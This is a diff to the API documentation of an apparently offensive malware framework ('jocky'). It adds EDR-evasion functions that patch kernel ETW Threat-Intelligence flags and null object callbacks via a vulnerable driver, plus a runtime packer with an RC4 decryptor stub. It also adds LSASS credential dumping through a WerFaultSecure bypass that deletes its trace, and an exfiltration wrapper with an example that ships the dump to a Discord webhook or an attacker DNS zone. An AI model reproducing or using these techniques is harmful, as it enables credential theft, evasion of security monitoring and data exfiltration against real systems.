@@ -670,7 +670,17 @@ All functions here require a `jocky_byovd_t` filled by `jocky_byovd_load()`.
 
 ### Bootstrap (happens automatically on first call)
 
-1. OS build number → selects EPROCESS offset table (pre-1903 vs 1903+).
+1. OS build number (via `RtlGetVersion`) → selects EPROCESS offset table.
+   Four entries cover all major Windows 10/11 releases:
+
+   | Build range | Epoch | UniqueProcessId | Token | _OBJECT_TYPE.CallbackList |
+   |---|---|---|---|---|
+   | 10240 – 14392 | Win10 1507/1511 | 0x2E8 | 0x358 | 0x0B8 |
+   | 14393 – 18361 | Win10 1607–1809 | 0x2E8 | 0x358 | 0x0B8 |
+   | 18362 – 22631 | Win10 1903–22H2 / Win11 21H2–23H2 | 0x440 | 0x4B8 | 0x0C8 |
+   | 26100+        | Win11 24H2+     | 0x440 | 0x4B8 | 0x0C8 |
+
+   `_TOKEN.Privileges.Enabled` offsets are also selected per-build (0x48/0x50 pre-1903, 0x50/0x58 post-1903).
 2. `NtQuerySystemInformation` → ntoskrnl VA + size.
 3. Physical memory scan (0x80000 → 1 GB) → System EPROCESS (PID 4).
 4. Read `EPROCESS.DirectoryTableBase` at that PA → CR3.
@@ -724,6 +734,61 @@ all kernel `EtwEventWrite` paths return without logging.
 
 ```
 ffi jocky_disable_etw(i8*) -> bool;
+```
+
+---
+
+### `jocky_disable_etw_ti(ctx) -> bool`
+
+Targets the **Microsoft-Windows-Threat-Intelligence** ETW provider
+(`{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`) specifically.  EDRs subscribe
+to this provider at the PPL-protected kernel level; it survives the global
+`EtwpEventEnabled` patch made by `jocky_disable_etw()`.
+
+Two complementary passes:
+
+**A — Per-function enable flags.**  Finds each `EtwTiLog*` export in
+ntoskrnl (`EtwTiLogReadWriteVm`, `EtwTiLogCreateUpdateProcThread`,
+`EtwTiLogMapViewOfSection`, `EtwTiLogAllocateVirtualMemory`,
+`EtwTiLogQueueApcThread`, `EtwTiLogSetContextThread`,
+`EtwTiLogProtectExecVm`) and zeros the RIP-relative enable-flag byte in
+each function's prologue.
+
+**B — GUID-entry disable.**  Scans the ntoskrnl image for the 16-byte TI
+provider GUID and zeros the `IsEnabled` counter in the `_ETW_GUID_ENTRY`
+at GUID+0x18.  This removes the provider at the registration level
+regardless of which `EtwTiLog*` path fires.
+
+Call this **in addition to** `jocky_disable_etw()` — they patch different
+flags.
+
+```
+ffi jocky_disable_etw_ti(i8*) -> bool;
+```
+
+---
+
+### `jocky_disable_ob_callbacks(ctx) -> bool`
+
+Removes **object callbacks** (`ObRegisterCallbacks`) for process and thread
+object types.  EDR drivers register these to intercept `OpenProcess` /
+`OpenThread` and strip `PROCESS_VM_READ`, `PROCESS_ALL_ACCESS` from the
+granted access mask — this is the mechanism that blocks process injection
+even after notify callbacks have been removed.
+
+Walks `_OBJECT_TYPE.CallbackList` for `PsProcessType` and `PsThreadType`
+(both exported from ntoskrnl).  For each active `_OB_CALLBACK_ENTRY`:
+
+1. Sets `Active = FALSE`.
+2. Nulls `PreOperation` and `PostOperation` function pointers.
+
+The `_OBJECT_TYPE.CallbackList` offset is selected from the build-specific
+offset table (`0x0B8` pre-1903, `0x0C8` on 1903+).
+
+Returns `true` if at least one callback entry was disabled.
+
+```
+ffi jocky_disable_ob_callbacks(i8*) -> bool;
 ```
 
 ---
@@ -1024,8 +1089,9 @@ fn exfil(raw: i8*, raw_len: i64) -> void {
        │
   [--manifest]      ──► appendSection(.jmani)  IOCTL primitive table
        │
-  [--pack]          ──► RC4 encrypt .text + .rdata in-place
-                        appendSection(.jkey)   16-byte RC4 key
+  [--pack]          ──► RC4 encrypt .text in-place  (.rdata left plaintext — IAT must survive)
+                        appendSection(.jkey)   16-byte RC4 key + 4-byte OEP RVA
+                        patch AddressOfEntryPoint → .jstub VirtAddr  (jocky_pack_stub_entry)
        │
   (always)          ──► appendSection(.jtamp)  XOR-folded CRC32 over all sections
 ```
@@ -1090,31 +1156,29 @@ Offset  Size  Field
 
 ### `.jstub` section  (`--pack`)
 
-Position-independent x86-64 decryptor stub injected by `packPE()`.
-`AddressOfEntryPoint` is patched to point here so the OS loader calls it
-before any user code.
+Runtime PE decryptor.  Compiled from `src/runtime/pack/stub_loader.c`
+(`#pragma clang section text=".jstub"` routes all code there), so the
+linker places `jocky_pack_stub_entry` in `.jstub` as part of the normal
+runtime build.  `packPE()` does not inject raw bytes — it simply reads the
+section's `VirtAddr` and writes it into `AddressOfEntryPoint`, redirecting
+the OS loader here before any user code runs.
+
+`.rdata` is deliberately **not** encrypted so the Windows loader can resolve
+the IAT before calling this entry point; `VirtualProtect` and
+`FlushInstructionCache` are called normally through the resolved IAT.
 
 **Execution sequence:**
 
 1. `GetModuleHandleA(NULL)` → image base
 2. Walk PE section table → locate `.jkey` (key + OEP RVA) and `.text`
 3. `VirtualProtect(.text, PAGE_EXECUTE_READWRITE)`
-4. RC4-decrypt `.text` in-place with the 16-byte key from `.jkey`
+4. RC4-decrypt `.text` in-place with the 16-byte key from `.jkey[0..15]`
 5. `VirtualProtect(.text, PAGE_EXECUTE_READ)` (restore)
 6. `FlushInstructionCache` → CPU sees decrypted bytes
-7. Jump to `image_base + oep_rva`
+7. Call `(image_base + oep_rva)` → original `main()`
 
 The section is never itself encrypted (packPE skips `.jstub` during the
-encryption pass).  Its source lives in `src/runtime/pack/stub_loader.c`;
-the compiled bytecode is embedded in `compiler/src/packer.cpp` as
-`kStubBytecode[]`.  Re-extract with:
-
-```sh
-clang -target x86_64-pc-windows-msvc -O2 -fno-stack-protector \
-      -fno-asynchronous-unwind-tables -mno-red-zone \
-      -o stub_loader.obj -c src/runtime/pack/stub_loader.c
-python3 scripts/extract_section.py stub_loader.obj .jstub
-```
+encryption pass).
 
 
 
@@ -1147,7 +1211,86 @@ Verified at startup by `jocky_verify_integrity()`.  Mismatch calls `ExitProcess(
 
 ---
 
-## 12  Cleanup / Anti-Forensics  *(Windows only unless noted)*
+## 12  Credential Dumping  *(Windows only)*
+
+LSASS dump via the **WerFaultSecure PPL bypass** — our process never opens a
+handle to LSASS.  Instead, we spawn `WerFaultSecure.exe`, a Microsoft-signed
+PPL process (`signingLevel WindowsTCB`) that Windows itself trusts to dump
+protected processes.  Defender sees a legitimate system binary doing the dump.
+
+All three functions require **SeDebugPrivilege** or SYSTEM.
+
+---
+
+### `jocky_lsass_pid() -> u32`
+
+Walk the process list via `NtQuerySystemInformation(SystemProcessInformation)`
+and return LSASS's PID.  Never calls `OpenProcess` on LSASS.
+
+```
+ffi jocky_lsass_pid() -> i32;   // returns 0 on failure
+```
+
+---
+
+### `jocky_lsass_dump_werfault(out_buf, out_size) -> bool`
+
+Full WerFaultSecure dump chain:
+
+| Step | Action |
+|------|--------|
+| 1 | `jocky_lsass_pid()` → PID (no handle to LSASS) |
+| 2 | Build cmdline: `WerFaultSecure.exe -u -p <lsass_pid> -ip <our_pid> -s 524288 /type 2` |
+| 3 | `CreateProcessW(CREATE_NO_WINDOW)` → wait ≤ 30 s |
+| 4 | Locate `%LOCALAPPDATA%\CrashDumps\lsass.exe.<lsass_pid>.dmp` |
+| 5 | `ReadFile` → heap buffer (`*out_buf`, `*out_size`) |
+| 6 | `DeleteFileW` immediately — no on-disk trace |
+
+Caller must free `*out_buf` with `jocky_free()`.
+
+```
+ffi jocky_lsass_dump_werfault(i8**, i64*) -> bool;
+```
+
+---
+
+### `jocky_lsass_exfil(exfil_url, exfil_type) -> bool`
+
+Convenience wrapper: dump → RC4-encrypt (16-byte prepended key) → exfil.
+
+| `exfil_type` | `exfil_url` format |
+|---|---|
+| `"discord"` | Full Discord webhook URL |
+| `"telegram"` | `"<bot_token>:<chat_id>"` |
+| `"github"` | `"<token>:<gist_id>"` |
+| `"dns"` | C2 DNS zone (e.g. `"exfil.attacker.com"`) |
+| `"http"` | Full HTTP/HTTPS URL |
+
+```
+ffi jocky_lsass_exfil(i8*, i8*) -> bool;
+```
+
+### Credential Dumping example
+
+```jky
+fn main() -> void {
+    // Dump LSASS in-memory (WerFaultSecure does the actual dump)
+    let buf:  i8* = null;
+    let size: i64 = 0;
+    let ok: bool = jocky_lsass_dump_werfault(&buf, &size);
+    if !ok { return; }
+
+    // ... parse with pypykatz-compatible reader, or just exfil raw ...
+    jocky_free(buf);
+
+    // Or in one call — dump + encrypt + ship to Discord:
+    jocky_lsass_exfil("https://discord.com/api/webhooks/...", "discord");
+}
+```
+
+---
+
+## 13  Cleanup / Anti-Forensics  *(Windows only unless noted)*
 
 Five targeted cleanup functions plus an orchestrator.  All require
 Administrator-level privileges.  Call after payload execution, before exit.
